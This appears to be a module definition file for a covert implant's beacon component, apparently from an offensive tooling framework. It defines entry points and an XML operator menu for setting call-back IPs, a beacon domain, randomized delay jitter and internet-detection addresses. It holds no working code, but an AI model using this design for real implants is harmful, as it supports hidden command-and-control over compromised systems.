File: BBANJO-3111.exe
Name: beaconModule
Version: 0x03010101
Priority: 1
ID: 0x80101
Activate: beacon_activate
Deactivate: beacon_deactivate
Chain: 0x10000000
Entry: entryPoint
getconfig: beacon_getconfig
reconfigure: beacon_reconfigure
Command: beacon_setParams
Command: beacon_getParams

<interface>
<menu>

  <menuItem>
    <itemText>Set Beacon Parameters</itemText>
    <queryList>
      <query>First beacon IP</query>
      <query>Second beacon IP</query>
      <query>Beacon count</query>
      <query>Primay delay</query>
      <query>Secondary delay</query>
      <query>Minimum random added delay</query>
      <query>Maximum random added delay</query>
      <query>Beacon Domain Name</query>
      <query>Internet detection address 1 (optional)</query>
      <query>Internet detection address 2 (optional)</query>
      <query>Internet detection address 3 (optional)</query>
      <query>Internet detection address 4 (optional)</query>
      <query>Internet detection address 5 (optional)</query>
      <query>Internet detection address 6 (optional)</query>
      <query>Internet detection address 7 (optional)</query>
      <query>Internet detection address 8 (optional)</query>
      <query>Internet detection address 9 (optional)</query>
      <query>Internet detection address 10 (optional)</query>
      
    </queryList>

    <miniProg>
      <progName>beacon_set_miniprog</progName>
      <handler>beacon_setParams</handler>
      <argList>
        <arg>--dest1</arg>
        <arg>--dest2</arg>
        <arg>--count</arg>
        <arg>--primary</arg>
        <arg>--secondary</arg>
        <arg>--min</arg>
        <arg>--max</arg>
        <arg>--domain</arg>
        <arg>--addr0</arg>
        <arg>--addr1</arg>
        <arg>--addr2</arg>
        <arg>--addr3</arg>
        <arg>--addr4</arg>
        <arg>--addr5</arg>
        <arg>--addr6</arg>
        <arg>--addr7</arg>
        <arg>--addr8</arg>
        <arg>--addr9</arg>        
      </argList>
    </miniProg>
  </menuItem>

  <menuItem>
    <itemText>Get Beacon Parameters</itemText>

    <miniProg>
      <progName>beacon_get_miniprog</progName>
      <handler>beacon_getParams</handler>
    </miniProg>
  </menuItem>

</menu>
</interface>

